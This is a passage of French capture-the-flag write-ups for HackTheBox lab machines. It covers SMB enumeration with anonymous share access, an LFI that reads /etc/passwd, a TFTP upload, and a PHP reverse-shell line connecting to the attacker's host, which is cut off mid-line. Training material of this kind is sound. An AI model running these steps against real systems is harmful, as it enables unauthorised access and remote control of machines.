peut lire, cr\u00e9er et mettre \u00e0 jour des fichiers sur le serveur distant. Il peut \u00e9galement communiquer avec n'importe quel programme serveur configur\u00e9 pour recevoir une demande de client SMB.</p> <p>Un stockage compatible SMB sur le r\u00e9seau est appel\u00e9 un partage, il est posible que vous en ayez vu d\u00e9j\u00e0 dans un explorateur windows. Ceux-ci sont accessibles par tout client disposant de l'adresse du serveur et des informations d'identification appropri\u00e9es. Comme de nombreux autres protocoles d'acc\u00e8s aux fichiers, SMB n\u00e9cessite certaines couches de s\u00e9curit\u00e9 pour fonctionner correctement dans une topologie de r\u00e9seau. Si SMB permet aux clients de cr\u00e9er, de modifier, de r\u00e9cup\u00e9rer et de supprimer des fichiers sur un partage, un m\u00e9canisme d'authentification est clairement n\u00e9cessaire. Au niveau de l'utilisateur, les clients SMB doivent fournir une combinaison nom d'utilisateur/mot de passe pour voir ou interagir avec le contenu du partage SMB.</p> <p>Bien qu'il ait la possibilit\u00e9 de s\u00e9curiser l'acc\u00e8s au partage, un administrateur r\u00e9seau peut parfois faire des erreurs et autoriser accidentellement des connexions sans informations d'identification valides ou en utilisant des comptes invit\u00e9s ou des connexions anonymes. Nous en serons t\u00e9moins dans les sections suivantes.</p>"},{"location":"tiers0/dancing/#enumeration","title":"\u00c9num\u00e9ration","text":"<p>rhost : 10.129.39.30 lhost : 10.10.15.253</p> <p>On teste que la machine est accesible avec un ping :</p> <pre><code>--- 10.129.39.30 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2014ms\nrtt min/avg/max/mdev = 28.358/29.434/31.122/1.208 ms\n</code></pre> <p>Puis on scanne la cible. L'ex\u00e9cution de la commande suivante avec nmap va analyser tous les ports et tenter d'afficher les versions de service pour chacun d'eux.</p> <p>-sV\u00a0 : sonde les ports ouverts pour d\u00e9terminer les informations de service/version -vvv : augmente la verbosit\u00e9 des r\u00e9sultats dans la console (affiche plus de r\u00e9sultats)</p> <pre><code>\u276f nmap -sV -vvv 10.129.39.30\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 00:37 CEST\nNSE: Loaded 45 scripts for scanning.\nInitiating Ping Scan at 00:37\nScanning 10.129.39.30 [4 ports]\nCompleted Ping Scan at 00:37, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 00:37\nCompleted Parallel DNS resolution of 1 host. at 00:37, 0.00s elapsed\nDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 00:37\nScanning 10.129.39.30 [1000 ports]\nDiscovered open port 139/tcp on 10.129.39.30\nDiscovered open port 445/tcp on 10.129.39.30\nDiscovered open port 135/tcp on 10.129.39.30\nCompleted SYN Stealth Scan at 00:37, 0.52s elapsed (1000 total ports)\nInitiating Service scan at 00:37\nScanning 3 services on 10.129.39.30\nCompleted Service scan at 00:37, 7.64s elapsed (3 services on 1 host)\nNSE: Script scanning 10.129.39.30.\nNSE: Starting runlevel 1 (of 2) scan.\nInitiating NSE at 00:37\nCompleted NSE at 00:37, 0.01s elapsed\nNSE: Starting runlevel 2 (of 2) scan.\nInitiating NSE at 00:37\nCompleted NSE at 00:37, 0.07s elapsed\nNmap scan report for 10.129.39.30\nHost is up, received echo-reply ttl 127 (0.031s latency).\nScanned at 2023-05-20 00:37:49 CEST for 8s\nNot shown: 997 closed tcp ports (reset)\nPORT    STATE SERVICE       REASON          VERSION\n135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC\n139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds? syn-ack ttl 127\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.99 seconds\n           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.040KB)\n</code></pre> <ul> <li>On va apliquer 45 scripts .nse (Loaded 45 scripts) qui font partie de nmap.</li> <li>Il y a un 'Ping Scan' que l'on aurait pu \u00e9viter avec -Pn (disable host discovery)</li> <li>Une resolution DNS (a \u00e9viter avec -n)</li> <li>Attention : ici on scanne seulement les 1000 premiers ports, si on veut tout scanner il faut -p- ou --allports</li> </ul> <p>Comme mentionn\u00e9 pr\u00e9c\u00e9demment, nous observons que le port 445 TCP pour SMB est op\u00e9rationnel, ce qui signifie que nous avons un partage actif que nous pourrions potentiellement explorer. Consid\u00e9rez ce partage comme un dossier accessible via Internet. Pour ce faire, nous aurons besoin des services et des scripts appropri\u00e9s install\u00e9s. Afin d'\u00e9num\u00e9rer avec succ\u00e8s le contenu partag\u00e9 sur le syst\u00e8me distant, nous pouvons utiliser un script appel\u00e9 smbclient . </p> <p>On cherche a savoir si nous avons smbclient dans notre machine.</p> <pre><code>\u276f which smbclient\n/usr/bin/smbclient\n\u276f smbclient -V\nVersion 4.17.7-Debian\n</code></pre> <p>Si le script n'est pas pr\u00e9sent sur notre machine, nous pouvons l'installer en tapant la commande suivante dans le terminal (pour les syst\u00e8mes d'exploitation bas\u00e9s sur Debian)</p> <pre><code>sudo apt install smbclient\n</code></pre> <p>Smbclient tentera de se connecter \u00e0 l'h\u00f4te distant et v\u00e9rifiera si une authentification est requise. Si c'est le cas, il vous demandera un mot de passe pour votre nom d'utilisateur local. </p> <pre><code>\u276f smbclient 10.129.39.30\nPassword for [WORKGROUP\\root]:\n</code></pre> <p>Nous devrions en prendre note. Si nous ne sp\u00e9cifions pas de nom d'utilisateur sp\u00e9cifique \u00e0 smbclient lors de la tentative de connexion \u00e0 l'h\u00f4te distant, il utilisera simplement le nom d'utilisateur de votre machine locale. C'est celui avec lequel vous \u00eates actuellement connect\u00e9 \u00e0 votre machine virtuelle. En effet, l'authentification SMB n\u00e9cessite toujours un nom d'utilisateur, donc en ne lui en donnant pas un explicitement pour essayer de se connecter, il lui suffira de transmettre votre nom d'utilisateur local actuel pour \u00e9viter de g\u00e9n\u00e9rer une erreur avec le protocole.</p> <p>N\u00e9anmoins, utilisons notre nom d'utilisateur local car nous ne connaissons aucun nom d'utilisateur distant pr\u00e9sent sur l'h\u00f4te cible avec lequel nous pourrions potentiellement nous connecter. Ensuite, apr\u00e8s cela, nous serons invit\u00e9s \u00e0 entrer un mot de passe. Ce mot de passe est li\u00e9 au nom d'utilisateur que vous avez entr\u00e9 auparavant. En th\u00e9orie, si nous \u00e9tions un utilisateur distant l\u00e9gitime essayant de se connecter \u00e0 sa ressource, nous conna\u00eetrions notre nom d'utilisateur et notre mot de passe et nous nous connecterions normalement pour acc\u00e9der \u00e0 notre partage. Dans ce cas, nous n'avons pas de telles informations d'identification, donc ce que nous essaierons d'effectuer est l'une des op\u00e9rations suivantes\u00a0:</p> <ul> <li>Authentification des invit\u00e9s</li> <li>Authentification anonyme</li> </ul> <p>Chacun de ces \u00e9l\u00e9ments nous obligera \u00e0 nous connecter sans conna\u00eetre la combinaison nom d'utilisateur/mot de passe appropri\u00e9e et \u00e0 voir les fichiers stock\u00e9s sur le partage. Continuons \u00e0 essayer cela. Nous laissons le champ du mot de passe vide, en appuyant simplement sur Entr\u00e9e pour dire au script de continuer.</p> <pre><code>\u276f smbclient -L 10.129.39.30\nPassword for [WORKGROUP\\root]:\n\nSharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    WorkShares      Disk      SMB1 disabled -- no workgroup available\n</code></pre> <p>Comme toujours, nous pouvons taper le nom de notre script dans le terminal suivi du commutateur -h ou --help pour en savoir plus sur les capacit\u00e9s de ce script ainsi que sur son utilisation.</p> <p>[-L|--list=HOST] : Selecting the targeted host for the connection request.</p> <p>Quelques exemples :  </p> <pre><code>\u276f smbclient --help | grep -E \"^ {1,}-L\"\n-L, --list=HOST                              Get a list of shares available\n\u276f smbclient --help | grep -E \"^ {1,}-A\"\n-A, --authentication-file=FILE               Get the credentials from a file\n\u276f smbclient --help | grep -E \"^ {1,}-D\"\n-D, --directory=DIR                          Start from directory\n</code></pre> <p>En ex\u00e9cutant la commande ci-dessus, nous voyons que quatre partages distincts sont affich\u00e9s. Passons en revue chacun d'eux et voyons ce qu'ils signifient.</p> <ul> <li>ADMIN$ - Les partages administratifs sont des partages r\u00e9seau cach\u00e9s cr\u00e9\u00e9s par la famille de syst\u00e8mes d'exploitation Windows NT qui permettent aux administrateurs syst\u00e8me d'avoir un acc\u00e8s \u00e0 distance \u00e0 chaque volume de disque sur un syst\u00e8me connect\u00e9 au r\u00e9seau. Ces partages ne peuvent pas \u00eatre d\u00e9finitivement supprim\u00e9s mais peuvent \u00eatre d\u00e9sactiv\u00e9s.</li> <li>C$ - Partage administratif pour le volume de disque C:. C'est l\u00e0 que le syst\u00e8me d'exploitation est h\u00e9berg\u00e9.</li> <li>IPC$ - Le partage de communication inter-processus. Utilis\u00e9 pour la communication inter-processus via des canaux nomm\u00e9s et ne fait pas partie du syst\u00e8me de fichiers.</li> <li>WorkShares - Partage personnalis\u00e9.</li> </ul> <p>Si on demande des infos avec la commande apropos : </p> <pre><code>\u276f apropos smbclient\nlibsmbclient (7)     - An extension library for browsers and that can be used as a generic browsing API.\nsmbclient (1)        - ftp-like client to access SMB/CIFS resources on servers\n</code></pre> <p>Il existe un outil d'aide pour linux, en dehors de man ou apropos ou info, qui s'appelle tldr. Voici ce qu'il nous dit sur smbclient :</p> <pre><code>\u276f tldr smbclient\n\nsmbclient\n\nFTP-like client to access SMB/CIFS resources on servers.\n  More information: https://manned.org/smbclient.\n\n- Connect to a share (user will be prompted for password; `exit` to quit the session):\n    smbclient //server/share\n\n- Connect with a different username:\n    smbclient //server/share --user username\n\n- Connect with a different workgroup:\n    smbclient //server/share --workgroup domain --user username\n\n- Connect with a username and password:\n    smbclient //server/share --user username%password\n\n- Download a file from the server:\n    smbclient //server/share --directory path/to/directory --command \"get file.txt\"\n- Upload a file to the server:\n    smbclient //server/share --directory path/to/directory --command \"put file.txt\"\n- List the shares from a server anonymously:\n    smbclient --list=server --no-pass\n</code></pre>"},{"location":"tiers0/dancing/#foothold","title":"Foothold","text":"<p>Nous allons essayer de nous connecter \u00e0 chacun des partages, \u00e0 l'exception du partage IPC$, qui n'a pas d'int\u00e9r\u00eat pour nous car il n'est pas consultable comme un r\u00e9pertoire normal et ne contient pas de fichiers que nous pourrions utiliser \u00e0 ce stade de notre apprentissage.  Nous utiliserons la m\u00eame tactique que pr\u00e9c\u00e9demment, en tentant de nous connecter sans les les informations d'identification appropri\u00e9es pour trouver des autorisations mal configur\u00e9es sur l'un ou l'autre de ces partages. Nous donnerons un mot de passe pour chaque nom d'utilisateur pour voir si cela fonctionne. Tout d'abord, essayons le nom ADMIN$.</p> <p>On peut \u00e9galement se connecter avec le flag -N (null session) si on a pas de creds. </p> <pre><code>\u276f smbclient -L 10.129.39.30 -N\n\nSharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    WorkShares      Disk      SMB1 disabled -- no workgroup available\n</code></pre> <p>Essai sur ADMIN$ : </p> <pre><code>\u276f smbclient \\\\\\\\10.129.39.30\\\\ADMIN$\nPassword for [WORKGROUP\\root]:\ntree connect failed: NT_STATUS_ACCESS_DENIED\n</code></pre> <p>La reponse est NT_STATUS_ACCESS_DENIED nous indiquant que nous n'avons pas les informations d'identification appropri\u00e9es pour nous connecter \u00e0 ce partage. Nous testons sur 'C$' avec le m\u00eame resultat.</p> <p>M\u00eame id\u00e9e ici. Derni\u00e8re chance. Nous tentons de nous connecter au partage SMB WorkShares personnalis\u00e9. Cela semble \u00eatre cr\u00e9\u00e9 par l'homme, donc sujet \u00e0 une mauvaise configuration.</p> <p><pre><code>\u276f smbclient \\\\\\\\10.129.39.30\\\\WorkShares\nPassword for [WORKGROUP\\root]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Mon Mar 29 10:22:01 2021\n..                                  D        0  Mon Mar 29 10:22:01 2021\nAmy.J                               D        0  Mon Mar 29 11:08:24 2021\nJames.P                             D        0  Thu Jun  3 10:38:03 2021\n5114111 blocks of size 4096. 1752038 blocks available\nsmb: \\&gt; </code></pre> Succ\u00e8s! Nous avons reussi a entrer dans ce partage et avons un prompt qui nous indique qu'on est dans un repertoire.</p> <p>Le partage WorkShares SMB \u00e9tait mal configur\u00e9, nous permettant de nous connecter sans les informations d'identification appropri\u00e9es. Nous pouvons voir notre invite de terminal chang\u00e9e en smb: &gt; , nous faisant savoir que notre shell interagit maintenant avec le service. Nous pouvons utiliser la commande help pour voir ce que nous pouvons faire dans ce shell. C'est un bon tip que de connaitre la commande help, elle peut \u00eatre souvent utile.</p> <p>Sur la sortie console, nous pouvons remarquer que la plupart des commandes auxquelles nous sommes habitu\u00e9s sous Linux sont pr\u00e9sentes. Nous utiliserons les \u00e9l\u00e9ments suivants pour naviguer dans le partage\u00a0:</p> <p>ls : fais un listing du contenu des r\u00e9pertoires dans le partage cd\u00a0: modification des r\u00e9pertoires actuels dans le partage get : t\u00e9l\u00e9chargement du contenu des r\u00e9pertoires dans le partage  exit : sortie du shell smb  </p> <p>Taper la commande ls nous montrera deux r\u00e9pertoires, un pour Amy.J et un pour James.P . Nous visitons le premier et rencontrons un fichier appel\u00e9 worknotes.txt , que nous pouvons t\u00e9l\u00e9charger \u00e0 l'aide de la commande get.</p> <p>Il en va de m\u00eame pour le repertoire de James.P sauf qu'ici nous avons un fichier nomm\u00e9 flag.txt (il s'agit du drapeau a capturer) </p> <p>On peut aussi voir le contenu des fichiers \u00e0 l'aide de la commande more, si on ne veut pas les t\u00e9l\u00e9charger. Pour savoir o\u00f9 l'on est on peu faire un pwd : </p> <pre><code>smb: \\James.P\\&gt; pwd\nCurrent directory is \\\\10.129.39.30\\WorkShares\\James.P\\\n</code></pre> <p>Une fois le shell SMB ferm\u00e9, nous pouvons lire les deux documents que nous avons exfiltr\u00e9s. Le document worknotes.txt semble faire allusion \u00e0 d'autres services qui pourraient \u00eatre exploit\u00e9s. G\u00e9n\u00e9ralement, ce type de fichiers se trouve sur les machines d'une entreprise. dans les machines d'un laboratoire Hack The Box Pro, indiquant votre prochaine cible ou pouvant \u00eatre \u00eatre utilis\u00e9s comme ressource pour une exploitation plus pouss\u00e9e ou un mouvement lat\u00e9ral au sein du laboratoire. Dans notre cas, il s'agit juste d'une preuve de concept. Nous n'aurons pas besoin de ce fichier.</p> <p>Le fichier flag.txt, cependant, est ce que nous recherchons. Nous le lisons et entrons le drapeau dans la plate-forme, poss\u00e9dant la machine \u00e0 danser.</p> <p>Toutes nos f\u00e9licitations!</p>"},{"location":"tiers0/explosion/","title":"Explosion","text":""},{"location":"tiers0/fawn/","title":"Fawn","text":"<p> Linux</p> <p>Fawn propose une introduction au service FTP </p> <p>Elle couvre :</p> <ul> <li>La description du principe de client / serveur</li> <li>La connection avec openvpn </li> <li>Ping</li> <li>Les bases de l'Enumeration a fin de reconnaitre un serveur ftp</li> <li>La connection au service ftp avec l'utilitaire <code>ftp</code> en ligne de commande.</li> </ul>"},{"location":"tiers0/meow/","title":"Meow","text":"<p> Linux</p> <p>Meow est la machine la plus simple dans le tiers 0 de l'academy HTB. Elle couvre :</p> <ul> <li>La connection avec openvpn</li> <li>Les bases de l'Enumeration avec ping &amp; nmap</li> <li>Les bases du service telnet</li> </ul>"},{"location":"tiers0/meow/#enumeration","title":"Enumeration","text":"<p>La commande ping <pre><code>ping -c3 {ip}\n</code></pre></p> <p>L'outil nmap <pre><code>nmap -sCV {ip}\n</code></pre></p> <p>La commande ls</p> <p>L'existence du fichier .flag pour les CTF</p>"},{"location":"tiers0/meow/#quelques-liens-supplementaires","title":"Quelques liens suppl\u00e9mentaires","text":"<ul> <li>Module Setting Up</li> <li>Introduction to Pwnbox : distribution personnalis\u00e9e en ligne Linux de Parrot Security</li> <li>Module Linux Fundamentals</li> <li>Videos de Plaintext</li> </ul>"},{"location":"tiers0/mongod/","title":"Mongod","text":""},{"location":"tiers0/preignition/","title":"Preignition","text":""},{"location":"tiers0/sinced/","title":"Sinced","text":""},{"location":"tiers1/appointment/","title":"Appointment","text":""},{"location":"tiers1/crocodile/","title":"Crocodile","text":""},{"location":"tiers1/funnel/","title":"funnel","text":""},{"location":"tiers1/ignition/","title":"Ignition","text":""},{"location":"tiers1/pennyworth/","title":"Pennyworth","text":""},{"location":"tiers1/responder/","title":"Responder","text":""},{"location":"tiers1/sequel/","title":"Sequel","text":""},{"location":"tiers1/tactics/","title":"Tactics","text":""},{"location":"tiers1/three/","title":"Three","text":""},{"location":"tiers2/archetype/","title":"Archetype","text":""},{"location":"tiers2/included/","title":"Included","text":"<p> Linux</p> <p>Included est une machine class\u00e9e tr\u00e8s facile. On y voit : </p> <ul> <li>LFI</li> <li>Tftp</li> <li>Reverse Shell</li> <li>LXD containers</li> </ul> <p>Introduction</p> <p>L'\u00e9num\u00e9ration est toujours la cl\u00e9 lorsqu'il s'agit de tests d'intrusion, - meilleure est l'\u00e9num\u00e9ration et plus nous avons de chances de trouver et d'exploiter des vuln\u00e9rabilit\u00e9s. La plupart du temps, vous ne trouverez pas 'la seule' vuln\u00e9rabilit\u00e9 qui vous accordera l'acc\u00e8s, mais plut\u00f4t la 'cha\u00eene de mauvaise configuration' qui, si elle est utilis\u00e9e ensemble, vous laissera entrer. Cette machine enseigne d'autres techniques d'\u00e9num\u00e9ration, m\u00eame sur un protocole de couche de transport diff\u00e9rent ( UDP ), et elle enseigne \u00e9galement que chaque testeur d'intrusion doit parfois utiliser Google pour voir comment effectuer certaines t\u00e2ches.</p> <p>rhost='10.129.102.34' lhost='10.10.15.253'</p>"},{"location":"tiers2/included/#enumeration","title":"\u00c9num\u00e9ration","text":"<p>Nous commen\u00e7ons, comme toujours, par scanner la cible pour trouver des ports ouverts :</p> <pre><code>\u276f rhost='10.129.102.34'\n\u276f nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv $rhost -oG initial.Included\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 00:48 CEST\nInitiating SYN Stealth Scan at 00:48\nScanning 10.129.102.34 [65535 ports]\nDiscovered open port 80/tcp on 10.129.102.34\nCompleted SYN Stealth Scan at 00:48, 10.41s elapsed (65535 total ports)\nNmap scan report for 10.129.102.34\nHost is up, received user-set (0.029s latency).\nScanned at 2023-05-19 00:48:28 CEST for 10s\nNot shown: 65334 closed tcp ports (reset), 200 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 63\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 10.54 seconds\n           Raw packets sent: 66766 (2.938MB) | Rcvd: 65365 (2.615MB)\n</code></pre> <pre><code>\u276f nmap -p80 -sVC $rhost\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 00:52 CEST\nNmap scan report for 10.129.102.34\nHost is up (0.027s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_Requested resource was http://10.129.102.34/?file=home.php\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.77 seconds\n</code></pre> <p>Nous avons juste un port 80 ouvert on dirais, avec :    </p> <ul> <li>Un site en php : http://10.129.102.34/?file=home.php  </li> <li>sur un serveur Apache httpd 2.4.29</li> </ul> <p></p> <p>Rien d\u2019int\u00e9ressant en navigant sur le site sauf le fait que l'url semble inclure des fichiers.php donc possible LFI (local file incusion)</p> <p>D'ailleurs on tente de voir le .htaccess comme ceci et \u00e7a marche : </p> <p>http://10.129.102.34/?file=.htaccess</p> <p>Et cela retourne :</p> <pre><code>RewriteEngine On RewriteCond %{THE_REQUEST} ^GET.*index\\.php [NC] RewriteRule (.*?)index\\.php/*(.*) /$1$2 [R=301,NE,L] # #AuthType Basic #AuthUserFile /var/www/html/.htpasswd #Require valid-user \n</code></pre> <p>Ce qui montre bien qu'il y a inclusion de fichier et aucun filtrage. </p> <p>On va tenter d'afficher /etc/passwd pour voir:  </p> <ul> <li>http://10.129.102.34/?file=../../../etc/passwd</li> <li>http://10.129.102.34/?file=/etc/passwd</li> </ul> <p>Cela marche aussi ! On fait ctrl + u pour avoir le contenu sous forme de lignes. et on le met dans un fichier sur notre disque avec vim. </p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nmike:x:1000:1000:mike:/home/mike:/bin/bash\ntftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin\n</code></pre> <p>On va filtrer un peu pour trouver des comptes. </p> <pre><code>\u276f cat passwd_file| grep nologin -v\nroot:x:0:0:root:/root:/bin/bash\nsync:x:4:65534:sync:/bin:/bin/sync\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nmike:x:1000:1000:mike:/home/mike:/bin/bash\n</code></pre> <p>On commence a voir des users.</p> <p>Vu la structure de l'url on va faire un test pour voir si le fichier home.php est la seule chose que est incluse et affich\u00e9e.</p> <p>Pour cela on fait ceci, puis on voit que les deux pages servent la m\u00eame chose. Il n'y a pas de difference (voir le diff)</p> <pre><code>wget -qO- http://10.129.102.34:80/home.php &gt; test.txt\nwget -qO- http://10.129.102.34/index.php &gt; test2.txt\n# Puis\n\u276f diff test.txt test2.txt\n</code></pre> <p>En fait au vu de ce qu'il y a dans le .htaccess il y a certainement une redirection. Voir le module mod_rewrite et les regles ici</p> <p>Ici on aurait pu fuzz pour voir si on trouve d'autres resources, je me demande ce que cela donnerait avec la redirection.</p> <p>Voyons d'abord comment cette fonctionnalit\u00e9 (LFI) pourrait fonctionner.</p> <pre><code>if ($_GET['file']) {\ninclude($_GET['file']);\n} else {\nheader(\"Location: http://$_SERVER[HTTP_HOST]/index.php?file=home.php\");\n}\n</code></pre> <p>Dans l'exemple ci-dessus, ce code se trouve dans index.php , il est utilis\u00e9 pour charger dynamiquement d'autres pages du site Web en utilisant la variable file comme point de contr\u00f4le. Si cette variable n'a pas \u00e9t\u00e9 sp\u00e9cifi\u00e9e dans la requ\u00eate GET, la page r\u00e9\u00e9crit automatiquement l'URL (fais une redirection) et charge home.php . Si la valeur a \u00e9t\u00e9 sp\u00e9cifi\u00e9e, le code tente de charger une page \u00e0 partir de la valeur de la variable. Voir la function header dans le site php.</p>"},{"location":"tiers2/included/#tftp","title":"TFTP","text":"<p>Revenons \u00e0 la t\u00e2che \u00e0 accomplir, bien qu'une inclusion de fichiers locaux soit un excellent moyen de collecter des informations et de lire des fichiers syst\u00e8me, l'objectif de chaque testeur d'intrusion est de r\u00e9aliser l'ex\u00e9cution de code \u00e0 distance sur un syst\u00e8me. Il existe une pl\u00e9thore de fa\u00e7ons dont un LFI peut se transformer en RCE (Remote code execution), depuis l'empoisonnement des journaux aux mots de passe en clair dans les fichiers de configuration et aux sauvegardes oubli\u00e9es, mais dans ce cas, le fichier passwd nous a donn\u00e9 un indice important sur la fa\u00e7on de proc\u00e9der.</p> <p>Le dernier utilisateur r\u00e9pertori\u00e9 s'appelle tftp .</p> <p><code>tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin</code></p> <p>Une recherche rapide sur Google r\u00e9v\u00e8le que le protocole TFTP (Trivial File Transfer Protocol) est un protocole simple qui fournit une fonction de transfert de fichiers de base sans authentification de l'utilisateur. TFTP est destin\u00e9 aux applications qui n'ont pas besoin des interactions sophistiqu\u00e9es fournies par le protocole de transfert de fichiers (FTP). Il est \u00e9galement r\u00e9v\u00e9l\u00e9 que TFTP utilise le protocole UDP (User Datagram Protocol) pour communiquer. Celui-ci est d\u00e9fini comme un protocole de transport de donn\u00e9es l\u00e9ger qui fonctionne au-dessus d'IP.</p> <pre><code>UDP fournit un m\u00e9canisme pour d\u00e9tecter les donn\u00e9es corrompues dans les paquets, mais il ne tente pas de r\u00e9soudre les autres probl\u00e8mes qui surviennent avec les paquets, tels que les paquets perdus ou en d\u00e9sordre.\nIl est impl\u00e9ment\u00e9 dans la couche de transport du mod\u00e8le OSI, connu comme un protocole rapide mais non fiable, contrairement \u00e0 TCP, qui est fiable mais plus lent qu'UDP.\nTout comme TCP contient des ports ouverts pour des protocoles tels que HTTP, FTP, SSH, etc.; UDP a des ports pour des protocoles qui fonctionnent pour UDP.\n</code></pre> <p>On va faire un scan UDP mais on va le limiter aux 100 premiers ports (on triche un peu car \u00e7a met une plombe...)</p> <pre><code>\u276f nmap -sU -p1-100 10.129.102.34\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-19 01:53 CEST\nNmap scan report for 10.129.102.34\nHost is up (0.028s latency).\nNot shown: 98 closed udp ports (port-unreach)\nPORT   STATE         SERVICE\n68/udp open|filtered dhcpc\n69/udp open|filtered tftp\n\nNmap done: 1 IP address (1 host up) scanned in 106.34 seconds\n</code></pre> <p>En attendant on en profite pour installer tftp</p> <pre><code>sudo apt install tftp\n</code></pre> <p>Nous allons uploader un fichier reverse.php a fin d'\u00e9tablir une connection avec notre machine.</p> <pre><code>\u276f tftp 10.129.102.34\ntftp&gt; put reverse.php Sent 75 bytes in 0.1 seconds\ntftp&gt; quit\n</code></pre> <p>Et on lance une \u00e9coute avec netcat : </p> <pre><code>nc -nvlp 443\n</code></pre> <p>Voici le contenu de notre fichier upload\u00e9 :  </p> <pre><code>\u276f cat reverse.php \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: reverse.php\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 &lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.253/443 